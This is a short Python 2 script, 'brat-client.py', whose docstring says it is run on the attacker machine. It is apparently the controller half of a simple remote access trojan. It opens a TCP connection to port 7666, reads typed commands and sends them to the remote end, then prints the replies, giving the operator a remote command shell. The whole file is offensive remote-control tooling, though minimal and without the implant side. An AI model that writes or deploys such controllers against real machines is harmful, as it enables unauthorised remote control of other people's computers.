#!/usr/bin/env python

"""
brat-client.py : Script to be run on attacker machine.

Usage:
    $ python brat-client.py
"""

__author__    = "Brian Jopling"
__copyright__ = "Copyright 2017"
__credits__   = ["Brian Jopling"]
__license__   = "GNU GENERAL PUBLIC LICENSE"
__version__   = "1.0.0"
__status__    = "Development"


""" IMPORTS """

import socket


""" GLOBALS """

PORT = 7666


""" FUNCTIONS """

def get_user_command():
    return raw_input('$ ')


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = socket.gethostname()
    sock.connect((host, PORT))
    print sock.recv(1024)
    while True:
        command = get_user_command()
        sock.send(command)
        print sock.recv(1024)


""" PROCESS """

if __name__ == "__main__":
    main()
